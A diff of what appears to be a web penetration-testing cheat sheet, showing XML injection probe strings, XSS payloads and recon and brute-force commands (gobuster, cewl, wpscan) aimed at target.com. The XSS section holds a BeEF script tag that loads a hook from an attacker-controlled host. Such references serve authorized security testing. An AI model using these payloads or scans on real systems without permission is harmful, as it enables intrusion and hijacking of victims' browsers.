@@ -206,12 +206,12 @@ stop_user_enumeration_bypass.rb www.target.com --ids 1-1000
 
 # XML Injection
 
-Single quote         foo'
-Double quote         foo"
-Greater than         foo>
-Less than            foo<			
-Comment tag          foo<!--
-Ampersand            &foo
+Single quote        foo'
+Double quote        foo"
+Greater than        foo>
+Less than           foo<			
+Comment tag         foo<!--
+Ampersand           &foo
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # XSS
@@ -230,8 +230,8 @@ Stored - example: guestbook
 
 curl http://target.com/login.php?user=`perl –e 'print "a" x 500'`
 
-# DOM Based XSS      <img src="x" onerror="alert(42)" />
-# BeEF               <script> src = "http://<attacker IP>:3000/hook.js"></script>
+# DOM Based XSS     <img src="x" onerror="alert(42)" />
+# BeEF              <script> src = "http://<attacker IP>:3000/hook.js"></script>
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Additional Guides
@@ -273,12 +273,14 @@ uniscan -u https://www.target.com -qweds
 wpscan --url https://target.com --enumerate vp,vt,cb,u,m
 
 - Bruteforce directories
+Create a custom wordlist
 cewl https://target.com/ > dict.txt
-dirb https://target.com/ dict.txt
 
-gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 50
-gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -t 50 -x php
-gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/sharepoint.txt
+gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt --wildcard > small.txt
+cat small.txt | grep -v 403 | grep Status
+
+gobuster dir -u https://target.com -w /opt/SecLists/Discovery/Web-Content/CMS/sharepoint.txt --wildcard > share.txt
+cat share.txt | grep -v 403 | grep Status
 
 - Install Firefox Add-ons
 Firefox > Preferences > Add-ons > type Wappalyzer > click on the search result > Add to Firefox > Add
